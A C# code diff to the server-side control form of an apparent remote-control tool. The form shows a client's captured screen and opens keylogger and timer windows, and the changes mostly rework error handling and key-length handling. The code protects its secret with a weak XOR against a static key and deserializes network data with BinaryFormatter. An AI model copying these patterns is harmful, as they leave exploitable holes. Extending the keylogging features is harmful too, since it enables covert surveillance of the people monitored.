@@ -27,8 +27,8 @@ namespace Server
             char[] charAArray = a.ToCharArray();
             char[] charBArray = b.ToCharArray();
 
-            byte[] result = new byte[27];
-            for (int i = 0; i < 27; i++)
+            byte[] result = new byte[KEY.Length];
+            for (int i = 0; i < KEY.Length; i++)
             {
                 result[i] = (byte)(charAArray[i] ^ charBArray[i]);
             }
@@ -50,9 +50,10 @@ namespace Server
             logClient = slogClient;
             screenClient = sscreenClient;
             Random random = new Random();
-            int length = 27;
             var randomPassword = "";
-            for (var i = 0; i < length; i++)
+            GetImage = new Thread(ReceiveImage);
+            GetImage.IsBackground = true;
+            for (var i = 0; i < KEY.Length; i++)
             {
                 randomPassword += ((char)(random.Next(65, 90))).ToString();
 
@@ -71,14 +72,16 @@ namespace Server
             catch (Exception exc)
             {
                 MessageBox.Show(exc.Message);
+                Application.Exit();
             }
             /************************************************************/
             byte[] encryptPassword = Xor(randomPassword, KEY);
             mainStream = client.GetStream();
-            Byte[] sendsecret = Combine(Combine(Encoding.ASCII.GetBytes("secret:"), encryptPassword), Encoding.ASCII.GetBytes("$"));
+            Byte[] sendsecret = Combine(
+                                    Combine(Encoding.ASCII.GetBytes("secret:"), 
+                                            encryptPassword), 
+                                    Encoding.ASCII.GetBytes("$"));
             mainStream.Write(sendsecret, 0, sendsecret.Length);
-            GetImage = new Thread(ReceiveImage);
-            GetImage.IsBackground = true;
             InitializeComponent();
         }
         private void StopSharing()
@@ -103,9 +106,11 @@ namespace Server
                     ScreenCapture.Image = (Image)binaryFormatter.Deserialize(screenStream);
 
                 }
-                MessageBox.Show("Client disconnected");
             }
-            catch { MessageBox.Show("Client disconnected"); }
+            catch{ 
+                MessageBox.Show("Client disconnected");
+                Application.Exit();
+            }
         }
         private void btnShareScreen_Click(object sender, EventArgs e)
         {
@@ -136,14 +141,13 @@ namespace Server
                     btnShareScreen.Text = "Share screen";
                 }
             }
-            catch (Exception)
+            catch
             {
-                MessageBox.Show("0 client connected");
+                Application.Exit();
             }
         }
         private void ControlForm_Load(object sender, EventArgs e)
         {
-
         }
         private void btnHenGio_Click(object sender, EventArgs e)
         {
@@ -153,9 +157,10 @@ namespace Server
                 Form HenGio = new HenGio(mainStream, clientID);
                 HenGio.Show();
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                MessageBox.Show("0 client connected");
+                MessageBox.Show(ex.Message);
+                Application.Exit();
             }
         }
         private void btnLogger_Click(object sender, EventArgs e)
@@ -170,9 +175,10 @@ namespace Server
                 Form Keylog = new Keylogger(logClient, clientID);
                 Keylog.Show();
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                MessageBox.Show("0 client connected");
+                MessageBox.Show(ex.Message);
+                Application.Exit();
             }
         }
     }
